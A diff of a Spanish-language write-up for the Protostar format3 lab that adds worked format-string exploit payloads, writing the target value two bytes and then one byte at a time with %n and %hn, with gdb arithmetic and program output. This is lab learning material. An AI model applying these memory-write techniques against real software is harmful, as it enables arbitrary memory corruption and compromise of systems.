@@ -225,7 +225,7 @@ $1 = 16930112
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08" + "%16930112x%12$n")' | ./format3 | tail -n1
 you have modified the target :)
 ```
-Extra -> en vez de escribir los 4 bytes, escribimos de 2 en 2
+###Extra -> en vez de escribir los 4 bytes, escribimos de 2 en 2
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn" + "%13$hn")' | ./format3 ;echo 
@@ -249,16 +249,56 @@ $1 = 21570
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
 target is 55440102 :(
 ```
-Vaya, resulta ser que nos ha salido al reves, asi que cuando trabajemos con dos bytes hay que poner o las memorias al reves o los argumentos al reves.
+Vaya, resulta ser que nos ha salido al reves (quizas no hemos tenido en cuenta el tema del endian que da la vuelta a todo) asi que cuando trabajemos con dos bytes hay que poner o las memorias al reves o los argumentos al reves.
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%13$hn" + "%21570x%12$hn")' | ./format3 | tail -n1
 you have modified the target :)
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf6\x96\x04\x08\xf4\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
 you have modified the target :)
+```
+###Extra -> en vez de escribir los 4 bytes, escribimos de 1 en 1
 
+Ahora como escribimos un byte por memoria, escribimos 4 memorias  (0x080496f4, f5, f6 y f7) Pero como no hay parejas de dos bytes que se cambien, pueden ir en el orden bueno
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n")' | ./format3 | tail -n1
+target is 10101010 :(
+```
+El ultimo byte tiene que ser 44 "01025544" -> primero por el endian \x44\x55\x02\x01""
+```console
+(gdb) print 0x44 - 0x10
+$1 = 52
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$n%13$n%14$n%15$n")' | ./format3 | tail -n1
+target is 44444444 :(
+```
+Ahora las restas siguiendo la lógica de antes. Al segundo byte añadirle la diferencia (entre lo que nos sale y lo que nos debe salir)
+
+```console
+(gdb) p 0x55 - 0x44
+$1 = 17
+(gdb) quit
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$n%17x%13$n%14$n%15$n")' | ./format3 | tail -n1
+target is 55555544 :(
+```
+Y con el resto leña al mono
+```console
+(gdb) p 0x02 - 0x55
+$2 = -83 -> Ha salido negativo asi que hay que meter un byte mas a la izquierda
+(gdb) p 0x102 - 0x55
+$3 = 173
+[user@protostar]-[/opt/protostar/bin]:$python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$n%17x%13$n%173x%14$n%15$n")' | ./format3 | tail -n1
+target is 02025544 :(
+(gdb) p 0x01 - 0x02
+$1 = -1
+(gdb) p 0x101 - 0x02 -> Igual que antes, bit a la izquierda
+$5 = 255
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$n%17x%13$n%173x%14$n%255x%15$n")' | ./format3 | tail -n1
+you have modified the target :)
 ```
 
+
+Articulo que me ha ayudado y del que he aprendido [aqui](https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83)
 
 ---------------------------------------------------------------------------
 # Sobreescribir la GOT para saltar a una funcion que nos interese-> [format4](https://exploit.education/protostar/format-four/)
